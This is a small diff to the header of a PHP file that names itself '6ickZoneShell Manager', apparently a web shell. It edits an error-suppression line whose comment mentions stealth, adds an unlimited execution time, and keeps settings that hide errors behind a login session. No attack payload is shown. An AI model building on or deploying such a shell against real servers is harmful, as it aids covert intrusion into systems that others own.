@@ -2,7 +2,8 @@
 /**
             * 6ickZoneShell Manager by 0x6ick x Nyx6st | Copyright 2025 by 6ickwhispers@gmail.com
           **/
-error_reporting(0); // Suppress all errors for stealth
+error_reporting(0); // Suppress all errors
+set_time_limit(0); //time
 session_start(); // Session is required for login
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
